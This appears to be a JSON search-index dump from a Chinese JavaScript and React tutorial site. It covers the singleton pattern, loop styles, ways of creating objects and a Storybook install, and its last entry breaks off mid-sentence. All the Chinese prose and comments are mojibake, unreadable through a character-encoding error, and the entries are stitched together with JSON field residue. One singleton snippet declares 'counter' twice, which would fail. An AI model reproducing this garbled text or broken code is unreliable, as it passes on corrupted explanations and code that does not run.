20 21 22 23 24 25 26 27 28 29 30 31 32 33  let instance; let counter = 0; class Counter { constructor() { if (instance) { throw new Error(\u0026#34;æ‚¨åªèƒ½åˆ›å»ºä¸€ä¸ªå®ä¾‹ï¼\u0026#34;); //throw è¯­å¥ç”¨æ¥æŠ›å‡ºä¸€ä¸ªç”¨æˆ·è‡ªå®šä¹‰çš„å¼‚å¸¸ã€‚å½“å‰å‡½æ•°çš„æ‰§è¡Œå°†è¢«åœæ­¢ï¼ˆthrow ä¹‹åçš„è¯­å¥å°†ä¸ä¼šæ‰§è¡Œï¼‰ã€‚  } instance = this; } getInstance() { return this; } getCount() { return counter; } increment() { return ++counter; } decrement() { return --counter; } } const counter = new Counter(); const counter2 = new Counter(); // Error: æ‚¨åªèƒ½åˆ›å»ºä¸€ä¸ªå®ä¾‹ï¼   ä¸Šé¢è¿™ç§æƒ…å†µï¼Œå¦‚æœå®ä¾‹å·²ç»å­˜åœ¨ï¼Œåˆ™ä¸åº”è¯¥ç»§ç»­ï¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯è®©ç”¨æˆ·çŸ¥é“ã€‚\nPerfect! æˆ‘ä»¬æ— æ³•å†åˆ›å»ºå¤šä¸ªå®ä¾‹ã€‚\n\rå¦‚ä½•å†»ç»“å•ä¾‹ï¼Ÿ è®©æˆ‘ä»¬ä» counter.js æ–‡ä»¶ä¸­å¯¼å‡º Counter å®ä¾‹ã€‚ ä½†åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬ä¹Ÿåº”è¯¥å†»ç»“å®ä¾‹ã€‚\nObject.freeze() æ–¹æ³•å¯ä»¥å†»ç»“ä¸€ä¸ªå¯¹è±¡ã€‚ä¸€ä¸ªè¢«å†»ç»“çš„å¯¹è±¡å†ä¹Ÿä¸èƒ½è¢«ä¿®æ”¹ã€‚æ­¤å¤–ï¼Œå†»ç»“ä¸€ä¸ªå¯¹è±¡åè¯¥å¯¹è±¡çš„åŸå‹ä¹Ÿä¸èƒ½è¢«ä¿®æ”¹ã€‚freeze() è¿”å›å’Œä¼ å…¥çš„å‚æ•°ç›¸åŒçš„å¯¹è±¡ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  let instance; let counter = 0; class Counter { constructor() { if (instance) { throw new Error(\u0026#34;æ‚¨åªèƒ½åˆ›å»ºä¸€ä¸ªå®ä¾‹ï¼\u0026#34;); } instance = this; } getInstance() { return this; } getCount() { return counter; } increment() { return ++counter; } decrement() { return --counter; } } const singletonCounter = Object.freeze(new Counter()); export default singletonCounter;   \rå•ä¾‹çš„å®ä¾‹æ¼”ç¤º Counterè®¡æ•°å™¨åº”ç”¨ç¨‹åºã€‚æœ‰ä»¥ä¸‹æ–‡ä»¶ï¼š\n counter.jsï¼šåŒ…å« Counter ç±»ï¼Œå¹¶å¯¼å‡ºä¸€ä¸ª Counter å®ä¾‹ä½œä¸ºå…¶é»˜è®¤å¯¼å‡º index.jsï¼šåŠ è½½ redButton.js å’Œ blueButton.js æ¨¡å— redButton.jsï¼šå¯¼å…¥Counterï¼Œå¹¶åœ¨çº¢è‰²æŒ‰é’®ä¸Šæ·»åŠ  Counter çš„ increment æ–¹æ³•ä½œä¸ºäº‹ä»¶ç›‘å¬å™¨ï¼Œé€šè¿‡è°ƒç”¨ getCount æ–¹æ³•è®°å½• counter çš„å½“å‰å€¼ blueButton.jsï¼šå¯¼å…¥Counterï¼Œå¹¶åœ¨è“è‰²æŒ‰é’®ä¸Šæ·»åŠ  Counter çš„ increment æ–¹æ³•ä½œä¸ºäº‹ä»¶ç›‘å¬å™¨ï¼Œé€šè¿‡è°ƒç”¨ getCount æ–¹æ³•è®°å½• counter çš„å½“å‰å€¼ blueButton.js å’Œ redButton.js ä» counter.js å¯¼å…¥ç›¸åŒçš„å®ä¾‹ã€‚ æ­¤å®ä¾‹åœ¨ä¸¤ä¸ªæ–‡ä»¶ä¸­éƒ½ä½œä¸º Counter å¯¼å…¥ã€‚  å½“æˆ‘ä»¬åœ¨ redButton.js æˆ– blueButton.js ä¸­è°ƒç”¨ increment æ–¹æ³•æ—¶ï¼Œä¸¤ä¸ªæ–‡ä»¶ä¸­ Counter å®ä¾‹çš„ counter å±æ€§çš„å€¼éƒ½ä¼šæ›´æ–°ã€‚ æˆ‘ä»¬ç‚¹å‡»çº¢è‰²æŒ‰é’®è¿˜æ˜¯è“è‰²æŒ‰é’®å¹¶ä¸é‡è¦ï¼šæ‰€æœ‰å®ä¾‹å…±äº«ç›¸åŒçš„å€¼ã€‚ è¿™å°±æ˜¯ä¸ºä»€ä¹ˆå³ä½¿æˆ‘ä»¬åœ¨ä¸åŒçš„æ–‡ä»¶ä¸­è°ƒç”¨è¯¥æ–¹æ³•ï¼Œè®¡æ•°å™¨ä¹Ÿä¼šä¸æ–­å¢åŠ  1 çš„åŸå› ã€‚\n\rä½¿ç”¨å¸¸è§„å¯¹è±¡å­—é¢é‡å®ç° åœ¨è®¸å¤šç¼–ç¨‹è¯­è¨€ä¸­ï¼Œä¾‹å¦‚ Java æˆ– C++ï¼Œæ— æ³•åƒåœ¨ JavaScript ä¸­é‚£æ ·ç›´æ¥åˆ›å»ºå¯¹è±¡ã€‚ åœ¨é‚£äº›é¢å‘å¯¹è±¡çš„ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªç±»ï¼Œé€šè¿‡å®ƒåˆ›å»ºä¸€ä¸ªå¯¹è±¡ã€‚åˆ›å»ºçš„å¯¹è±¡å…·æœ‰ç±»çš„å®ä¾‹çš„å€¼ï¼Œå°±åƒ JavaScript ç¤ºä¾‹ä¸­å®ä¾‹çš„å€¼ä¸€æ ·ã€‚\nä½†æ˜¯ï¼Œä¸Šé¢ç¤ºä¾‹ä¸­æ˜¾ç¤ºçš„ç±»å®ç°å®é™…ä¸Šæ˜¯çŸ«æ‰è¿‡æ­£ã€‚ç”±äºæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨ JavaScript ä¸­åˆ›å»ºå¯¹è±¡ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç®€å•åœ°ä½¿ç”¨å¸¸è§„å¯¹è±¡æ¥å®ç°å®Œå…¨ç›¸åŒçš„ç»“æœã€‚\n count property å°† count çš„å€¼ +1 çš„ increment æ–¹æ³• å°† count çš„å€¼ -1 çš„ decrement æ–¹æ³•  ä¸ ES6 çš„ class å®ç°æ–¹å¼ç­‰æ•ˆ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  let count = 0; const counter = { increment() { return ++count; }, decrement() { return --count; } }; Object.freeze(counter); export { counter };   ç”±äºå¯¹è±¡æ˜¯é€šè¿‡å¼•ç”¨ï¼ˆreferenceï¼‰ä¼ é€’çš„ï¼Œå› æ­¤ redButton.js å’Œ blueButton.js éƒ½å¯¼å…¥äº†å¯¹åŒä¸€ä¸ª singletonCounter å¯¹è±¡çš„å¼•ç”¨ã€‚ ä¿®æ”¹å…¶ä¸­ä¸€ä¸ªæ–‡ä»¶ä¸­çš„ count å€¼å°†ä¿®æ”¹ singletonCounter ä¸Šçš„å€¼ï¼Œè¿™åœ¨ä¸¤ä¸ªæ–‡ä»¶ä¸­éƒ½å¯è§ã€‚\n\rå•ä¾‹çš„ä¼˜ç¼ºç‚¹ å°†å®ä¾‹åŒ–é™åˆ¶ä¸ºä»…ä¸€ä¸ªå®ä¾‹å¯èƒ½ä¼šèŠ‚çœå¤§é‡å†…å­˜ç©ºé—´ã€‚ä¸å¿…æ¯æ¬¡éƒ½ä¸ºä¸€ä¸ªæ–°å®ä¾‹è®¾ç½®å†…å­˜ï¼Œæˆ‘ä»¬åªéœ€ä¸ºæ•´ä¸ªåº”ç”¨ç¨‹åºå¼•ç”¨çš„é‚£ä¸ªå®ä¾‹è®¾ç½®å†…å­˜ã€‚\nç„¶è€Œï¼Œå•ä¾‹å®é™…ä¸Šè¢«è®¤ä¸ºæ˜¯ä¸€ç§åæ¨¡å¼ï¼Œå¹¶ä¸”å¯ä»¥ï¼ˆæˆ–åº”è¯¥ï¼‰åœ¨ JavaScript ä¸­é¿å…ã€‚\nè®©æˆ‘ä»¬ä»‹ç»ä¸€ä¸‹ä½¿ç”¨å•ä¾‹çš„ä¸€äº›ç¼ºç‚¹ï¼\n1. æµ‹è¯• æµ‹è¯•ä¾èµ–äº Singleton çš„ä»£ç å¯èƒ½ä¼šå˜å¾—æ£˜æ‰‹ã€‚ ç”±äºæˆ‘ä»¬ä¸èƒ½æ¯æ¬¡éƒ½åˆ›å»ºæ–°çš„å®ä¾‹ï¼Œæ‰€ä»¥æ‰€æœ‰çš„æµ‹è¯•éƒ½ä¾èµ–äºå¯¹ä¹‹å‰æµ‹è¯•çš„å…¨å±€å®ä¾‹çš„ä¿®æ”¹ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæµ‹è¯•çš„é¡ºåºå¾ˆé‡è¦ï¼Œä¸€ä¸ªå°çš„ä¿®æ”¹å¯èƒ½ä¼šå¯¼è‡´æ•´ä¸ªæµ‹è¯•å¥—ä»¶å¤±è´¥ã€‚ æµ‹è¯•åï¼Œæˆ‘ä»¬éœ€è¦é‡ç½®æ•´ä¸ªå®ä¾‹ï¼Œä»¥é‡ç½®æµ‹è¯•æ‰€åšçš„ä¿®æ”¹ã€‚\nsrc/conterTest.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  // æ­¤æ–‡ä»¶æ˜¯å¿…éœ€çš„ï¼Œç¡®ä¿æ­¤ç¤ºä¾‹ä¸­çš„æµ‹è¯•ä¸ä¼šå¤±è´¥ã€‚ // å®ƒæ˜¯ counter.js çš„å‰¯æœ¬  let instance; let counter = 0; class Counter { constructor() { if (instance) { throw new Error(\u0026#34;æ‚¨åªèƒ½åˆ›å»ºä¸€ä¸ªå®ä¾‹ï¼\u0026#34;); } instance = this; this.counter = counter; } getInstance() { return this; } getCount() { return counter; } increment() { return ++counter; } decrement() { return --counter; } } const singletonCounter = Object.freeze(new Counter()); export default singletonCounter;   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  import Counter from \u0026#34;../src/counterTest\u0026#34;; test(\u0026#34;å¢åŠ  1 æ¬¡åº”è¯¥æ˜¯ 1\u0026#34;, () =\u0026gt; { Counter.increment(); expect(Counter.getCount()).toBe(1); }); test(\u0026#34;å¢åŠ  3 ä¸ªé¢å¤–çš„æ¬¡æ•°åº”è¯¥æ˜¯ 4\u0026#34;, () =\u0026gt; { Counter.increment(); Counter.increment(); Counter.increment(); expect(Counter.getCount()).toBe(4); }); test(\u0026#34;é€’å‡1æ¬¡åº”è¯¥æ˜¯3\u0026#34;, () =\u0026gt; { Counter.decrement(); expect(Counter.getCount()).toBe(3); });   2. ä¾èµ–éšè— åœ¨æœ¬ä¾‹ä¸­å¯¼å…¥å¦ä¸€ä¸ªæ¨¡å— superCounter.js æ—¶ï¼Œè¯¥æ¨¡å—å¯¼å…¥çš„å•ä¾‹å¯èƒ½å¹¶ä¸æ˜æ˜¾ã€‚ åœ¨å…¶ä»–æ–‡ä»¶ä¸­ï¼Œä¾‹å¦‚æœ¬ä¾‹ä¸­çš„ index.jsï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå¯¼å…¥è¯¥æ¨¡å—å¹¶è°ƒç”¨å…¶æ–¹æ³•ã€‚ è¿™æ ·ï¼Œæˆ‘ä»¬ä¸å°å¿ƒä¿®æ”¹äº† Singleton ä¸­çš„å€¼ã€‚ è¿™å¯èƒ½ä¼šå¯¼è‡´æ„å¤–è¡Œä¸ºï¼Œå› ä¸ºå¯ä»¥åœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºä¸­å…±äº«å¤šä¸ªå•ä¾‹å®ä¾‹ï¼Œè¿™äº›å®ä¾‹ä¹Ÿä¼šè¢«ä¿®æ”¹ã€‚\n3. å…¨å±€è¡Œä¸º Singleton å®ä¾‹åº”è¯¥èƒ½å¤Ÿåœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºä¸­è¢«å¼•ç”¨ã€‚å…¨å±€å˜é‡æœ¬è´¨ä¸Šè¡¨ç°å‡ºç›¸åŒçš„è¡Œä¸ºï¼šç”±äºå…¨å±€å˜é‡åœ¨å…¨å±€èŒƒå›´å†…å¯ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºä¸­è®¿é—®è¿™äº›å˜é‡ã€‚\næ‹¥æœ‰å…¨å±€å˜é‡é€šå¸¸è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªç³Ÿç³•çš„è®¾è®¡å†³ç­–ã€‚å…¨å±€èŒƒå›´æ±¡æŸ“æœ€ç»ˆå¯èƒ½ä¼šæ„å¤–è¦†ç›–å…¨å±€å˜é‡çš„å€¼ï¼Œä»è€Œå¯¼è‡´è®¸å¤šæ„å¤–è¡Œä¸ºã€‚\nåœ¨ ES2015 ä¸­ï¼Œåˆ›å»ºå…¨å±€å˜é‡æ˜¯ç›¸å½“ç½•è§çš„ã€‚æ–°çš„ let å’Œ const å…³é”®å­—é€šè¿‡å°†ä½¿ç”¨è¿™ä¸¤ä¸ªå…³é”®å­—å£°æ˜çš„å˜é‡ä¿æŒåœ¨å—èŒƒå›´å†…æ¥é˜²æ­¢å¼€å‘äººå‘˜æ„å¤–æ±¡æŸ“å…¨å±€èŒƒå›´ã€‚ JavaScript ä¸­çš„æ–°æ¨¡å—ç³»ç»Ÿé€šè¿‡èƒ½å¤Ÿä»æ¨¡å—å¯¼å‡ºå€¼å¹¶å°†è¿™äº›å€¼å¯¼å…¥å…¶ä»–æ–‡ä»¶ï¼Œä»è€Œåœ¨ä¸æ±¡æŸ“å…¨å±€èŒƒå›´çš„æƒ…å†µä¸‹æ›´å®¹æ˜“åœ°åˆ›å»ºå…¨å±€å¯è®¿é—®å€¼ã€‚\nä½†æ˜¯ï¼Œå•ä¾‹çš„å¸¸è§ç”¨ä¾‹æ˜¯åœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºä¸­æ‹¥æœ‰æŸç§å…¨å±€çŠ¶æ€ã€‚è®©ä»£ç åº“çš„å¤šä¸ªéƒ¨åˆ†ä¾èµ–åŒä¸€ä¸ªå¯å˜å¯¹è±¡å¯èƒ½ä¼šå¯¼è‡´æ„å¤–è¡Œä¸ºã€‚\né€šå¸¸ï¼Œä»£ç åº“çš„æŸäº›éƒ¨åˆ†ä¿®æ”¹è¿™äº›å…¨å±€çŠ¶æ€ä¸­çš„å€¼ï¼Œè€Œå…¶ä»–éƒ¨åˆ†åˆ™ä½¿ç”¨è¯¥æ•°æ®ã€‚è¿™é‡Œçš„æ‰§è¡Œé¡ºåºå¾ˆé‡è¦ï¼šæˆ‘ä»¬ä¸æƒ³åœ¨æ²¡æœ‰æ•°æ®è¦æ¶ˆè´¹çš„æ—¶å€™ï¼ˆè¿˜ï¼‰ä¸å°å¿ƒå…ˆæ¶ˆè´¹æ•°æ®ï¼éšç€åº”ç”¨ç¨‹åºçš„å¢é•¿ï¼Œäº†è§£ä½¿ç”¨å…¨å±€çŠ¶æ€æ—¶çš„æ•°æ®æµä¼šå˜å¾—éå¸¸æ£˜æ‰‹ï¼Œå¹¶ä¸”æ•°åä¸ªç»„ä»¶ç›¸äº’ä¾èµ–ã€‚\n\rReact ä¸­çš„çŠ¶æ€ç®¡ç† åœ¨ React ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸é€šè¿‡ Redux æˆ– React Context ç­‰çŠ¶æ€ç®¡ç†å·¥å…·æ¥ä¾èµ–å…¨å±€çŠ¶æ€ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ Singletonã€‚ å°½ç®¡å®ƒä»¬çš„å…¨å±€çŠ¶æ€è¡Œä¸ºå¯èƒ½çœ‹èµ·æ¥ç±»ä¼¼äº Singleton çš„è¡Œä¸ºï¼Œä½†è¿™äº›å·¥å…·æä¾›åªè¯»çŠ¶æ€è€Œä¸æ˜¯ Singleton çš„å¯å˜çŠ¶æ€ã€‚ ä½¿ç”¨ Redux æ—¶ï¼Œåªæœ‰çº¯å‡½æ•°åŒ–ç®€å™¨ï¼ˆreducersï¼‰æ‰èƒ½åœ¨ç»„ä»¶é€šè¿‡è°ƒåº¦ç¨‹åºï¼ˆdispatcherï¼‰å‘é€æ“ä½œåæ›´æ–°çŠ¶æ€ã€‚\nå°½ç®¡ä½¿ç”¨è¿™äº›å·¥å…·å¹¶æ²¡æœ‰ç¥å¥‡åœ°æ¶ˆé™¤æ‹¥æœ‰å…¨å±€çŠ¶æ€çš„ç¼ºç‚¹ï¼Œä½†æˆ‘ä»¬è‡³å°‘å¯ä»¥ç¡®ä¿å…¨å±€çŠ¶æ€æŒ‰ç…§æˆ‘ä»¬æƒ³è¦çš„æ–¹å¼è¿›è¡Œå˜å¼‚ï¼Œå› ä¸ºç»„ä»¶ä¸èƒ½ç›´æ¥æ›´æ–°çŠ¶æ€ã€‚\n\rçŸ¥è¯†ç‚¹  class å¯¹è±¡å­—é¢é‡ throw è¯­å¥ Object.freeze()  ","description":"åœ¨åº”ç”¨ç¨‹åºä¸­å…±äº«ä¸€ä¸ªå…¨å±€å®ä¾‹","id":47,"section":"react-patterns","tags":null,"title":"å•ä¾‹æ¨¡å¼","uri":"https://codthing.github.io/react-patterns/design-patterns/single-patterns/"},{"content":"è¿™é‡Œç”¨ For å¾ªç¯ä¸¾ä¾‹\nå‘½ä»¤å¼ 1 2 3 4 5 6 7 8 9 10 11 12 13  const files = [\u0026#34;foo.txt \u0026#34;, \u0026#34;.bar\u0026#34;, \u0026#34; \u0026#34;, \u0026#34;baz.foo\u0026#34;]; let filePaths = []; for (let file of files) { const fileName = file.trim(); if (fileName) { const filePath = `~/cool_app/${fileName}`; filePaths.push(filePath); } } // filePaths = [ \u0026#39;~/cool_app/foo.txt\u0026#39;, \u0026#39;~/cool_app/.bar\u0026#39;, \u0026#39;~/cool_app/baz.foo\u0026#39;]   å‡½æ•°å¼ å°è£…æ€§æ›´å¥½\n1 2 3 4 5 6 7 8 9 10 11 12  const files = [\u0026#34;foo.txt \u0026#34;, \u0026#34;.bar\u0026#34;, \u0026#34; \u0026#34;, \u0026#34;baz.foo\u0026#34;]; const filePaths = files.reduce((acc, file) =\u0026gt; { const fileName = file.trim(); if (fileName) { const filePath = `~/cool_app/${fileName}`; acc.push(filePath); } return acc; }, []); // filePaths = [ \u0026#39;~/cool_app/foo.txt\u0026#39;, \u0026#39;~/cool_app/.bar\u0026#39;, \u0026#39;~/cool_app/baz.foo\u0026#39;]   é“¾å¼ ä¸å‡½æ•°å¼ç›¸æ¯”ï¼Œæ›´ç›´è§‚ï¼Œä¹Ÿæ˜¯å»ºè®®ä½¿ç”¨çš„æ–¹å¼\n1 2 3 4 5 6 7 8  const files = [\u0026#34;foo.txt \u0026#34;, \u0026#34;.bar\u0026#34;, \u0026#34; \u0026#34;, \u0026#34;baz.foo\u0026#34;]; const filePaths = files .map((file) =\u0026gt; file.trim()) .filter(Boolean) .map((fileName) =\u0026gt; `~/cool_app/${fileName}`); // filePaths = [ \u0026#39;~/cool_app/foo.txt\u0026#39;, \u0026#39;~/cool_app/.bar\u0026#39;, \u0026#39;~/cool_app/baz.foo\u0026#39;]   ","description":"å¸¸è§çš„ç¼–ç¨‹æ¨¡å¼","id":48,"section":"javascript","tags":null,"title":"å‘½ä»¤å¼ vs å‡½æ•°å¼ vs é“¾å¼","uri":"https://codthing.github.io/javascript/function/for/"},{"content":"ä¸€ã€åˆ›å»ºå¯¹è±¡ï¼ˆå­—é¢é‡å¯¹è±¡ï¼‰ 1 2 3 4  let duck = { name: \u0026#34;Aflac\u0026#34;, numLegs: 2 }   è¿™ä¸ª duck å¯¹è±¡æœ‰ä¸¤ç»„é”®å€¼å¯¹ï¼šä¸€ä¸ªæ˜¯ name å±æ€§ï¼Œå®ƒçš„å€¼æ˜¯ Aflacï¼›å¦ä¸€ä¸ªæ˜¯ numLegs å±æ€§ï¼Œå®ƒçš„å€¼æ˜¯ 2ã€‚\n\räºŒã€è®¿é—®å¯¹è±¡ 1 2 3 4 5  let duck = { name: \u0026#34;Aflac\u0026#34;, numLegs: 2 }; console.log(duck.name); // Aflac   å¯ä»¥ç”¨ ç‚¹å·è¡¨ç¤ºæ³• æ¥è®¿é—®å¯¹è±¡çš„å±æ€§ï¼Œduck åé¢åŠ ä¸Šç‚¹å·ä»¥åŠå±æ€§å nameï¼Œæ¥è®¿é—®åˆ° Aflacã€‚\n\rä¸‰ã€åœ¨å¯¹è±¡ä¸Šåˆ›å»ºæ–¹æ³• å¯¹è±¡å¯ä»¥æœ‰ä¸€ä¸ªå«åš method çš„ç‰¹æ®Šå±æ€§ã€‚\næ–¹æ³•å±æ€§ä¹Ÿå°±æ˜¯å‡½æ•°ã€‚ è¿™ç»™å¯¹è±¡æ·»åŠ äº†ä¸åŒçš„è¡Œä¸ºã€‚\nä»¥ä¸‹å°±æ˜¯ä¸€ä¸ªå¸¦æœ‰æ–¹æ³•å±æ€§çš„ duck ç¤ºä¾‹ï¼š\n1 2 3 4 5 6  let duck = { name: \u0026#34;Aflac\u0026#34;, numLegs: 2, sayName: function() {return \u0026#34;The name of this duck is \u0026#34; + duck.name + \u0026#34;.\u0026#34;;} }; duck.sayName(); // The name of this duck is Aflac.   \rå››ã€ä½¿ç”¨ this å…³é”®å­—æé«˜ä»£ç é‡ç”¨æ€§ 1  sayName: function() {return \u0026#34;The name of this duck is \u0026#34; + duck.name + \u0026#34;.\u0026#34;;}   è™½ç„¶è¿™æ˜¯è®¿é—®å¯¹è±¡å±æ€§çš„æœ‰æ•ˆæ–¹æ³•ï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªé™·é˜±ã€‚\nå¦‚æœå˜é‡åå‘ç”Ÿäº†æ”¹å˜ï¼Œé‚£ä¹ˆå¼•ç”¨äº†åŸå§‹åç§°çš„ä»»ä½•ä»£ç éƒ½éœ€è¦æ›´æ–°ã€‚\nåœ¨ä¸€ä¸ªç®€çŸ­çš„å¯¹è±¡å®šä¹‰ä¸­ï¼Œè¿™å¹¶ä¸æ˜¯é—®é¢˜ï¼Œä½†æ˜¯å¦‚æœå¯¹è±¡æœ‰å¾ˆå¤šå¯¹å…¶å±æ€§çš„å¼•ç”¨ï¼Œé‚£ä¹ˆå‘ç”Ÿé”™è¯¯çš„å¯èƒ½æ€§å°±æ›´å¤§äº†ã€‚\nå¯ä»¥ä½¿ç”¨ this å…³é”®å­— æ¥é¿å…è¿™ä¸€é—®é¢˜ï¼š\n1 2 3 4 5  let duck = { name: \u0026#34;Aflac\u0026#34;, numLegs: 2, sayName: function() {return \u0026#34;The name of this duck is \u0026#34; + this.name + \u0026#34;.\u0026#34;;} };   this æ˜¯ä¸€ä¸ªå¾ˆå¤æ‚çš„çŸ¥è¯†ç‚¹ï¼Œè€Œä¸Šé¢é‚£ä¸ªä¾‹å­ä¹Ÿåªæ˜¯ä½¿ç”¨å®ƒçš„ä¸€ç§æ–¹æ³•è€Œå·²ã€‚\nåœ¨å½“å‰çš„ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­ï¼Œthis æŒ‡å‘çš„å°±æ˜¯ä¸è¿™ä¸ªæ–¹æ³•æœ‰å…³è”çš„ duck å¯¹è±¡ã€‚\nå¦‚æœæŠŠå¯¹è±¡çš„å˜é‡åæ”¹ä¸º mallardï¼Œé‚£ä½¿ç”¨ this åå°±æ²¡æœ‰å¿…è¦åœ¨ä»£ç ä¸­æ‰¾åˆ°æ‰€æœ‰æŒ‡å‘ duck çš„éƒ¨åˆ†ã€‚\nè¿™æ ·å¯ä»¥ä½¿å¾—ä»£ç æ›´å…·æœ‰å¯è¯»æ€§å’Œå¤ç”¨æ€§ã€‚\n\ræ€»ç»“ å­—é¢é‡å¯¹è±¡å¾ˆç®€æ´ï¼Œä½†æ˜¯ä¸å¤Ÿçµæ´»ï¼Œå› ä¸ºä¸èƒ½ä¼ å‚\n","description":"ç®€æ´","id":49,"section":"javascript","tags":null,"title":"åŸºæœ¬çš„JSå¯¹è±¡ï¼ˆå­—é¢é‡å¯¹è±¡ï¼‰","uri":"https://codthing.github.io/javascript/algorithms-data/object-programming/create-object/"},{"content":"Object æ¦‚è¿° Object æ˜¯ JavaScript çš„ä¸€ç§ æ•°æ®ç±»å‹ ã€‚å®ƒç”¨äºå­˜å‚¨å„ç§é”®å€¼é›†åˆå’Œæ›´å¤æ‚çš„å®ä½“ã€‚\nObjects å¯ä»¥é€šè¿‡ å¯¹è±¡å­—é¢é‡ã€æ„é€ å‡½æ•° æˆ–è€… class çš„æ–¹å¼åˆ›å»º\nä¸€ã€å¯¹è±¡å­—é¢é‡ ï¼ˆ{\u0026hellip;}ï¼‰ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  let user = { name: \u0026#34;Lucy\u0026#34;, sayHi(){ console.log(this.name) // Lucy, thisæŒ‡çš„æ˜¯â€œå½“å‰çš„å¯¹è±¡â€  } } user.sayHi() // Lucy  // ç®­å¤´å‡½æ•° // è¿™æ˜¯ç®­å¤´å‡½æ•°çš„ä¸€ä¸ªç‰¹æ€§ï¼Œå½“æˆ‘ä»¬å¹¶ä¸æƒ³è¦ä¸€ä¸ªç‹¬ç«‹çš„ thisï¼Œåè€Œæƒ³ä»å¤–éƒ¨ä¸Šä¸‹æ–‡ä¸­è·å–æ—¶ï¼Œå®ƒå¾ˆæœ‰ç”¨ã€‚ let user = { name: \u0026#34;Lucy\u0026#34;, sayHi() { let arrow = () =\u0026gt; console.log(this.name); arrow(); } }; user.sayHi(); // Lucy   äºŒã€æ„é€ å™¨ + new å¸¸è§„çš„ {\u0026hellip;} ï¼ˆå­—é¢é‡ï¼‰ è¯­æ³•å…è®¸åˆ›å»ºä¸€ä¸ªå¯¹è±¡ã€‚ä½†æ˜¯æˆ‘ä»¬ç»å¸¸éœ€è¦åˆ›å»ºè®¸å¤šç±»ä¼¼çš„å¯¹è±¡ï¼Œä¾‹å¦‚å¤šä¸ªç”¨æˆ·æˆ–èœå•é¡¹ç­‰ã€‚\nè¿™å¯ä»¥ä½¿ç”¨æ„é€ å™¨ï¼ˆæ„é€ å‡½æ•°ï¼‰å’Œnewæ“ä½œç¬¦æ¥å®ç°ã€‚\nä»æŠ€æœ¯ä¸Šè®²ï¼Œä»»ä½•å‡½æ•°ï¼ˆé™¤äº†ç®­å¤´å‡½æ•°ï¼Œå®ƒæ²¡æœ‰è‡ªå·±çš„ thisï¼‰éƒ½å¯ä»¥ç”¨ä½œæ„é€ å™¨ã€‚\nå³å¯ä»¥é€šè¿‡ new æ¥è¿è¡Œï¼Œå®ƒä¼šæ‰§è¡Œä¸Šé¢çš„ç®—æ³•ã€‚\né¦–å­—æ¯å¤§å†™æ˜¯ä¸€ä¸ªå…±åŒçš„çº¦å®šï¼Œä»¥æ˜ç¡®è¡¨ç¤ºä¸€ä¸ªå‡½æ•°å°†è¢«ä½¿ç”¨ new æ¥è¿è¡Œã€‚\n#. çº¦å®š æ„é€ å‡½æ•°åœ¨æŠ€æœ¯ä¸Šæ˜¯å¸¸è§„å‡½æ•°ã€‚ä¸è¿‡æœ‰ä¸¤ä¸ªçº¦å®šï¼š\n å®ƒä»¬çš„å‘½åä»¥å¤§å†™å­—æ¯å¼€å¤´ã€‚ å®ƒä»¬åªèƒ½ç”± new æ“ä½œç¬¦æ¥æ‰§è¡Œã€‚  #. å®åˆ— 1 2 3 4 5 6 7 8 9 10 11 12 13  function User(name) { // this = {};ï¼ˆéšå¼åˆ›å»ºï¼‰  // æ·»åŠ å±æ€§åˆ° this  this.name = name; this.isAdmin = false; // return this;ï¼ˆéšå¼è¿”å›ï¼‰ } const val1 = new User(\u0026#34;Jack\u0026#34;); console.log(val1) //{name: \u0026#34;Jack\u0026#34;, isAdmin: false, constructor: Object}   ç­‰åŒäºå­—é¢é‡Object\n1 2 3 4 5 6 7  let user = { name: \u0026#34;Jack\u0026#34;, isAdmin: false } console.log(user) //name: \u0026#34;Jack\u0026#34;, isAdmin: false}   ä¸‰ã€class + new 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  class ClassMates{ constructor(name,age){ this.name=name; this.age=age; } displayInfo(){ return this.name + \u0026#34;is \u0026#34; + this.age + \u0026#34; years old!\u0026#34;; } } // ç”¨æ³•ï¼š let classmate = new ClassMates(\u0026#34;Mike Will\u0026#34;,15); classmate.displayInfo(); // result: Mike Will is 15 years old!  // å…¶å®classä¹Ÿæ˜¯ä¸€ä¸ªfunction console.log(typeof ClassMates); // function   ","description":"Object ä¸‰å‰‘å®¢","id":50,"section":"javascript","tags":null,"title":"å­—é¢é‡ vs æ„é€ å™¨ vs class","uri":"https://codthing.github.io/javascript/function/new/"},{"content":"åœ¨ç°æœ‰é¡¹ç›®çš„æ ¹ç›®å½•ä¸­è¿è¡Œï¼š\nnpx sb init è¿è¡Œï¼š\nyarn storybook ","description":"React Storybook ç®€ä»‹","id":51,"section":"react","tags":null,"title":"å®‰è£…","uri":"https://codthing.github.io/react/storybook/sb-started/sb-install/"},{"content":"JavaScript é»˜è®¤æ˜¯åŒæ­¥çš„ï¼Œå¹¶ä¸”æ˜¯å•çº¿ç¨‹çš„ã€‚è¿™æ„å‘³ç€ä»£ç ä¸èƒ½åˆ›å»ºæ–°çº¿ç¨‹å¹¶å¹¶è¡Œè¿è¡Œã€‚\nä¸€è¡Œä¸€è¡Œçš„ä»£ç 